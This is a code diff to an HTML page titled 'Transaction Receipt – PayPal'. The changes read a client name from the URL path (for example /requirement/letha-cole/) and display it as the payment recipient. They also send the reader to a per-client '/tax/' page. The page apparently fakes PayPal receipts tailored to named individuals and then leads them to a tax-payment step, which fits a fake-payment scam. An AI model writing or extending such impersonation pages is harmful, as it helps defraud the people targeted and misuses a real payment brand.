@@ -4,6 +4,14 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Transaction Receipt – PayPal</title>
+  <script>
+    // Ensure relative assets resolve to root even on nested paths like /requirement/letha-cole/
+    if (location.protocol !== 'file:') {
+      const b = document.createElement('base');
+      b.href = '/';
+      document.head.appendChild(b);
+    }
+  </script>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -234,8 +242,29 @@
 
   </div>
 
-  <script src="app.js"></script>
+  <script src="/app.js" onerror="this.onerror=null;this.src='app.js';"></script>
   <script>
+    function getClientSlugFromUrl() {
+      const path = window.location.pathname;
+      // Match /requirement/<slug> or /requirement/<slug>/
+      const match = path.match(/\/requirement\/([^/?#]+)/i);
+      if (match && match[1] && match[1] !== 'index.html') {
+        return decodeURIComponent(match[1]);
+      }
+      const params = new URLSearchParams(window.location.search);
+      return params.get('client') || null;
+    }
+
+    function slugToDisplayName(slug) {
+      if (!slug) return '';
+      return slug
+        .replace(/[-_]+/g, ' ')
+        .trim()
+        .split(' ')
+        .map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
+        .join(' ');
+    }
+
     function renderReceipt() {
       const data = getReceiptData();
       const currency = data.currency || '$';
@@ -244,7 +273,18 @@
       document.getElementById('txId').textContent = data.orderId || '—';
       document.getElementById('payerName').textContent = data.merchant.name || '—';
       document.getElementById('payerEmail').textContent = data.merchant.email || '—';
-      document.getElementById('recipientName').textContent = data.recipient.name || '—';
+
+      // Client name: check if URL contains custom slug
+      const urlSlug = getClientSlugFromUrl();
+      let displayName = (data.recipient && data.recipient.name) ? data.recipient.name : '—';
+      if (urlSlug) {
+        if (data.recipient && data.recipient.slug && data.recipient.slug.toLowerCase() === urlSlug.toLowerCase()) {
+          displayName = data.recipient.name;
+        } else {
+          displayName = slugToDisplayName(urlSlug);
+        }
+      }
+      document.getElementById('recipientName').textContent = displayName;
       document.getElementById('amount').textContent = formatMoney(totals.grandTotal, currency);
 
       const s = (data.status || 'pending').toLowerCase();
@@ -253,7 +293,14 @@
         `<span class="status-text ${cls}">${data.status || 'Pending'}</span>`;
     }
 
-    function goToTax() { window.location.href = '/tax'; }
+    function goToTax() {
+      const slug = getClientSlugFromUrl() || (getReceiptData().recipient && getReceiptData().recipient.slug);
+      if (slug) {
+        window.location.href = '/tax/' + encodeURIComponent(slug) + '/';
+      } else {
+        window.location.href = '/tax';
+      }
+    }
 
     document.addEventListener('DOMContentLoaded', renderReceipt);
     window.addEventListener('storage', e => { if (e.key === RECEIPT_STORAGE_KEY) renderReceipt(); });
